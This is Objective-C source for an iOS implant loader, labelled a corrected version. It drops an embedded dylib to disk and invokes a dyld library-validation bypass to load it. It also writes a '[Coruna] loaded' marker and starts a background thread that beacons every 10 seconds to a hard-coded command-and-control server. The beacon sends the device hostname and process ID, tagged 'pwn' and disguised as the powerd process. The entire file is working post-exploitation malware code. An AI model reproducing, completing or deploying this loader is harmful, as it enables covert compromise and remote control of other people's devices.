// TweakLoader.m - 修正版
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <pthread.h>
#import <mach/mach.h>
#import <mach-o/ldsyms.h>
#import <mach-o/getsect.h>

// ============ C2 配置 ============
#define C2_HOST "192.168.245.162"
#define C2_PORT 8888

// ============ 函数指针 ============
extern pthread_t pthread_main_thread_np(void);
extern void _pthread_set_self(pthread_t p);

static void              (*_abort)(void);
static int               (*_close)(int);
static void*             (*_dlsym)(void *, const char *);
static uint8_t*          (*_getsectiondata)(const struct mach_header_64 *, const char *, const char *, unsigned long *);
static mach_port_t       (*_mach_thread_self)(void);
static int               (*_open)(const char *, int, ...);
static int               (*_read)(int, void *, size_t);
static void              (*__pthread_set_self)(pthread_t p);
static pthread_t         (*_pthread_main_thread_np)(void);
static int               (*_strncmp)(const char *, const char *, size_t);
static kern_return_t     (*_thread_terminate)(mach_port_t);
static int               (*_write)(int, const void *, size_t);

// C2 函数指针
static int               (*_socket)(int, int, int);
static int               (*_connect)(int, const struct sockaddr *, socklen_t);
static ssize_t           (*_send)(int, const void *, size_t, int);
static pid_t             (*_getpid)(void);
static int               (*_gethostname)(char *, size_t);
static int               (*_snprintf)(char *, size_t, const char *, ...);
static int               (*_pthread_create)(pthread_t *, const void *, void *(*)(void *), void *);
static int               (*_pthread_detach)(pthread_t);
static void              (*_sleep)(unsigned int);

int dyld_lv_bypass_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);

// ============ 原有函数 ============
const char *save_actual_dylib(void) {
    const char *path = "/var/mobile/Media/actual.dylib";
    int fd = _open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) return NULL;
    
    size_t dylib_size = 0;
    const uint8_t *dylib = _getsectiondata(
        (const struct mach_header_64 *)&_mh_dylib_header,
        "__TEXT", "__SBTweak", &dylib_size);
    
    if (!dylib || dylib_size == 0) {
        _close(fd);
        return NULL;
    }
    
    if (_write(fd, dylib, dylib_size) != dylib_size) {
        _close(fd);
        _abort();
    }
    _close(fd);
    return path;
}

static void append_marker(void) {
    const char *path = "/var/mobile/Media/Books/1.txt";
    int fd = _open(path, O_RDONLY, 0);
    if (fd >= 0) {
        char buf[128];
        _read(fd, buf, sizeof(buf));
        _close(fd);
    }

    fd = _open(path, O_WRONLY | O_APPEND, 0);
    if (fd < 0) return;

    const char *marker = "\n[Coruna] loaded\n";
    _write(fd, marker, 17);
    _close(fd);
}

// ============ C2 心跳 ============
static void* c2_beacon(void *arg) {
    while (1) {
        int sock = _socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            _sleep(10);
            continue;
        }
        
        struct sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        
        if (inet_pton(AF_INET, C2_HOST, &server.sin_addr) <= 0) {
            _close(sock);
            _sleep(10);
            continue;
        }
        
        if (_connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            _close(sock);
            _sleep(10);
            continue;
        }
        
        char hostname[256] = {0};
        _gethostname(hostname, sizeof(hostname) - 1);
        
        char req[1024];
        int len = _snprintf(req, sizeof(req),
            "POST /api/checkin HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: 80\r\n"
            "Connection: close\r\n"
            "\r\n"
            "{\"id\":\"pwn-%s-%d\",\"proc\":\"powerd\",\"pid\":%d}",
            C2_HOST, C2_PORT, hostname, _getpid(), _getpid());
        
        _send(sock, req, len, 0);
        _close(sock);
        _sleep(10);
    }
    return NULL;
}

static void start_c2_beacon(void) {
    _socket = _dlsym(RTLD_DEFAULT, "socket");
    _connect = _dlsym(RTLD_DEFAULT, "connect");
    _send = _dlsym(RTLD_DEFAULT, "send");
    _getpid = _dlsym(RTLD_DEFAULT, "getpid");
    _gethostname = _dlsym(RTLD_DEFAULT, "gethostname");
    _snprintf = _dlsym(RTLD_DEFAULT, "snprintf");
    _pthread_create = _dlsym(RTLD_DEFAULT, "pthread_create");
    _pthread_detach = _dlsym(RTLD_DEFAULT, "pthread_detach");
    _sleep = _dlsym(RTLD_DEFAULT, "sleep");
    
    pthread_t tid;
    _pthread_create(&tid, NULL, c2_beacon, NULL);
    _pthread_detach(tid);
}

// ============ PAC 支持 ============
#if __arm64e__
__attribute__((noinline)) void *pacia(void* ptr, uint64_t ctx) {
    __asm__("xpaci %[value]\n" : [value] "+r"(ptr));
    __asm__("pacia %0, %1" : "+r"(ptr) : "r"(ctx));
    return ptr;
}
#endif

// ============ 入口点 ============
int last(void) {
#if __arm64e__
    _dlsym = pacia(dlsym, 0);
    __pthread_set_self = pacia(_pthread_set_self, 0);
    _pthread_main_thread_np = pacia(pthread_main_thread_np, 0);
#else
    _dlsym = dlsym;
    __pthread_set_self = _pthread_set_self;
    _pthread_main_thread_np = pthread_main_thread_np;
#endif
    __pthread_set_self(_pthread_main_thread_np());
    
    _abort = _dlsym(RTLD_DEFAULT, "abort");
    _close = _dlsym(RTLD_DEFAULT, "close");
    _getsectiondata = _dlsym(RTLD_DEFAULT, "getsectiondata");
    _mach_thread_self = _dlsym(RTLD_DEFAULT, "mach_thread_self");
    _open = _dlsym(RTLD_DEFAULT, "open");
    _read = _dlsym(RTLD_DEFAULT, "read");
    _strncmp = _dlsym(RTLD_DEFAULT, "strncmp");
    _thread_terminate = _dlsym(RTLD_DEFAULT, "thread_terminate");
    _write = _dlsym(RTLD_DEFAULT, "write");
    
    // dyld bypass
    const char *path = save_actual_dylib();
    if (path) {
        dyld_lv_bypass_init(_dlsym, path);
    }
    append_marker();
    
    // 启动 C2 回连
    start_c2_beacon();
    
    // 终止当前线程
    _thread_terminate(_mach_thread_self());
    return 0;
}

int end(void) {
    return 0;
}
